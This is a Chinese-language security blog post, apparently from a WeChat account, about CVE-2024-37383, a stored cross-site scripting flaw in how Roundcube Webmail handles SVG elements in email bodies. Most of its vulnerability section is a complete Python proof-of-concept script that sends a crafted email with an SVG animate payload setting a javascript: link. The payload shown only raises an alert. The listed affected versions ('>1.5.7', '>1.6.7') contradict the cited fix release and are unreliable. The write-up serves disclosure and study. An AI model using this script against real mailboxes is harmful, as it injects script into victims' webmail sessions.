#  CVE-2024-37383｜Roundcube Webmail存储型XSS漏洞（POC）   
alicy  信安百科   2024-11-02 17:48  
  
****  
  
**0x00 前言**  
  
****  
Roundcube Webmail是一个开源的基于web的电子邮件客户端，旨在提供用户友好的界面和强大的功能，使用户能够通过web浏览器方便地访问和管理他们的电子邮件。  
  
  
Roundcube支持标准的邮件协议（如IMAP和SMTP），并提供了许多常见的邮件功能，如收发邮件、管理联系人、创建日历事件等。其界面简洁直观，易于使用，同时还支持插件扩展，用户可以根据自己的需求定制功能。  
  
  
Roundcube Webmail被广泛应用于个人用户、企业和组织，为他们提供了一个方便、安全的电子邮件管理解决方案。  
  
  
  
**0x01 漏洞描述**  
  
  
在Roundcube Webmail中发现了CVE-2024-37383漏洞。这是一个存储的XSS漏洞，允许攻击者在用户页面上执行JavaScript代码。  
  
  
错误出现在处理电子邮件正文标记中的SVG元素的代码中。在显示电子邮件之前，Roundcube会处理某些标签的内容及其属性。  
  
  
  
**0x02 CVE编号**  
  
  
CVE-2024-37383  
  
  
  
**0x03 影响版本**  
  
  
Roundcube Webmail >1.5.7  
  
Roundcube Webmail >1.6.7  
  
  
  
**0x04 漏洞详情**  
  
  
POC：  
  
https://github.com/bartfroklage/CVE-2024-37383-POC  
  
```
import smtplib
import argparse
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CVE-2024-37383 Proof Of Concept")
    parser.add_argument("-e", "--sender_email", required=True, help="Sender's email address")
    parser.add_argument("-p", "--sender_password", required=True, help="Sender's email password")
    parser.add_argument("-t", "--recipient_email", required=True, help="Recipient's email address")
    parser.add_argument("-sh", "--smtp_host", default="smtp.gmail.com", help="SMTP host address")
    parser.add_argument("-sp", "--smtp_port", default=587, help="SMTP port number")

    args = parser.parse_args()

    msg = MIMEMultipart('alternative')
    msg["From"] = args.sender_email
    msg["To"] = args.recipient_email
    msg["Subject"] = "CVE-2024-37383 Proof Of Concept"

    text = "Please use HTML view to see this email."
    html = """\
    <html>
    <head></head>
    <body>
        <svg>
            <animate attributeName="href " values="javascript:alert(\'You are powned.\')" href="#link" />
            </animate>
            <a id="link">
                <text x=20 y=20>Click me</text>
            </a>
        </svg>
    </body>
    </html>
    """
    msg.attach(MIMEText(text, 'plain'))
    msg.attach(MIMEText(html, 'html'))

    try:
        server = smtplib.SMTP(args.smtp_host, args.smtp_port)
        server.set_debuglevel(True)
        server.starttls()
        server.login(args.sender_email, args.sender_password)
        server.sendmail(args.sender_email, args.recipient_email, msg.as_string())
        server.quit()
        print("Email sent successfully.")
    except Exception as e:
        print("An error occurred:", str(e))
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Whm7t4Je6urwFbJSQOvp8LYTFoem4VE3rxfnWpjibAPWa4fZY42atgLjr1dJG0KBMQSTOTdnb2Y8wLYqnfWxqjA/640?wx_fmt=png&from=appmsg "")  
  
  
  
**0x05 参考链接**  
  
  
https://github.com/roundcube/roundcubemail/commit/43aaaa528646877789ec028d87924ba1accf5242  
  
  
https://github.com/roundcube/roundcubemail/releases/tag/1.5.7  
  
  
  
  
推荐阅读：  
  
  
[CVE-2024-42009｜Roundcube Webmail跨站脚本漏洞](http://mp.weixin.qq.com/s?__biz=Mzg2ODcxMjYzMA==&mid=2247485549&idx=2&sn=bd0fed193fad260b6fb53993cc21a43c&chksm=cea961b4f9dee8a2403a5e78f84a204c10ac46ff846355e6b66ab4215306df91c43f6c022cc8&scene=21#wechat_redirect)  
  
  
  
[N/A｜Roundcube Webmail存在远程代码执行漏洞（POC）](http://mp.weixin.qq.com/s?__biz=Mzg2ODcxMjYzMA==&mid=2247485474&idx=2&sn=c87807bbe8f26ab6c0e05336ace5d5f4&chksm=cea961fbf9dee8edd252018b4b32f3446653c24c74a2a2b33c5a3bafe8295266ca3cfab5d998&scene=21#wechat_redirect)  
  
  
  
[CVE-2024-9264｜Grafana SQL表达式允许远程代码执行（POC）](http://mp.weixin.qq.com/s?__biz=Mzg2ODcxMjYzMA==&mid=2247485671&idx=2&sn=3c50f92d11faad65195774409be07b3b&chksm=cea9613ef9dee828fe54dcf107742dd30993caea07e0477c78d244ca86e048f76a75112725c5&scene=21#wechat_redirect)  
  
  
  
  
  
Ps：国内外安全热点分享，欢迎大家分享、转载，请保证文章的完整性。文章中出现敏感信息和侵权内容，请联系作者删除信息。信息安全任重道远，感谢您的支持![](https://mmbiz.qpic.cn/mmbiz_png/Whm7t4Je6urTIficI8UhQibwpYWx4ic7Bk40AJlXrgx3icofWCbd5cbJFheld132R8exvlHnicn0AUjHLmVok4wV9qA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
！！！  
  
  
**本公众号的文章及工具仅提供学习参考，由于传播、利用此文档提供的信息而造成任何直接或间接的后果及损害，均由使用者本人负责,本公众号及文章作者不为此承担任何责任。**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Whm7t4Je6uqQ24S6worK6npevNP8p1uPc9jQeMAib2iaibBnibOzFaIbD0KlvsEtUAmL3xdbJJnWk74Y1KfBcIazzw/640?wx_fmt=png "")  
  
  
